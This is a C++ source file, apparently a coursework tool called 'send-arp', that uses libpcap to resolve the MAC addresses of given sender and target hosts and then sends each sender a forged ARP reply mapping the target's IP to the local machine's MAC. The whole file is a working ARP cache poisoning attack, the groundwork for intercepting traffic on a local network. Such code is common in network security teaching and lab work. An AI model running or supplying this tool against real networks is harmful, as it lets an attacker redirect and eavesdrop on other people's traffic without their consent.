#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <cstdint>
#include <fstream>
#include <streambuf>
#include <regex>


#include <stdio.h>
#include <pcap/pcap.h>
#include <libnet.h>
#include <sys/ioctl.h>
#include <net/if.h> 
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

using namespace std;

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp ens33 192.168.0.21 192.168.0.16\n");
}

// reference
string getMyMAC(const string &ifname) {
  ifstream iface("/sys/class/net/" + ifname + "/address");
  string str((istreambuf_iterator<char>(iface)), istreambuf_iterator<char>());
  if (str.length() > 0) {
	return str;
  } else {
    perror("cant find mac address");
	exit(-1);
  }
}

// reference
string getMyIp(char* dev) {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    char buf[20];
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if(ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		perror("ioctl error");
		exit(-1);
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, buf, sizeof(struct sockaddr));
    close(s);
    return string(Ip(buf));
}

void makePacket(
	EthArpPacket* packet,
	uint16_t op_type,
	const char* eth_smac,
	const char* eth_dmac,
	const char* arp_smac,
	const char* arp_tmac,
	const char* arp_sip,
	const char* arp_tip
) {

	// eth header
	packet->eth_.dmac_ = Mac(eth_dmac);
	packet->eth_.smac_ = Mac(eth_smac);
	packet->eth_.type_ = htons(EthHdr::Arp);

	// arp header
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(op_type); // ArpHdr::Request, ArpHdr::Reply	
	packet->arp_.smac_ = Mac(arp_smac);
	packet->arp_.sip_ = htonl(Ip(arp_sip));
	packet->arp_.tmac_ = Mac(arp_tmac);
	packet->arp_.tip_ = htonl(Ip(arp_tip));
}

Mac getMacByIp(pcap_t* handle, Ip ip, Mac myMac, Ip myip) {

	Mac retMac;
	EthArpPacket arpPacket;
	makePacket(
		&arpPacket,
		ArpHdr::Request,
		std::string(myMac).c_str(),
		"FF:FF:FF:FF:FF:FF",
		std::string(myMac).c_str(),
		"00:00:00:00:00:00",
		std::string(myip).c_str(),
		std::string(ip).c_str()
	);
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpPacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* recv_packet;
		int res = pcap_next_ex(handle, &header, &recv_packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) { // error
			printf("pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
			break;
		}
		
		EthArpPacket* recv_packet_pointer = (EthArpPacket*) recv_packet;
		if (recv_packet_pointer->eth_.type() == EthHdr::Arp) {
			if (recv_packet_pointer->arp_.op() == ArpHdr::Reply && recv_packet_pointer->arp_.sip() == ip){
				retMac = recv_packet_pointer->arp_.smac();
				break;
			}
		}
	}

	return retMac;
}

int main(int argc, char* argv[]) {
	if (!((argc >= 4) && (argc % 2 == 0))) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s error=%s\n", dev, errbuf);
		return -1;
	}
	for(int i = 0; i < (argc - 2) / 2; i++){
		Mac myMac = getMyMAC(std::string(dev));
		Ip myIp = getMyIp(dev);
		Ip senderIp(argv[2 + 2*i]);
		Ip targetIp(argv[3 + 2*i]);

		Mac senderMac = getMacByIp(handle, senderIp, myMac, myIp);
		Mac targetMac = getMacByIp(handle, targetIp, myMac, myIp);

		EthArpPacket packet;

		makePacket(
			&packet,
			ArpHdr::Reply,
			std::string(myMac).c_str(),
			std::string(senderMac).c_str(),
			std::string(myMac).c_str(),
			std::string(senderMac).c_str(),
			string(targetIp).c_str(),
			string(targetIp).c_str()
		);

		printf("#%d my Ip: %s", i + 1, string(myIp).c_str());
		printf("#%d my Mac: %s", i + 1, string(myMac).c_str());
		printf("#%d sender Ip: %s", i + 1, string(senderIp).c_str());
		printf("#%d sender Mac: %s", i + 1, string(senderMac).c_str());
		printf("#%d target Ip: %s", i + 1, string(targetIp).c_str());
		printf("#%d target Mac: %s", i + 1, string(targetMac).c_str());

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}


	pcap_close(handle);

}
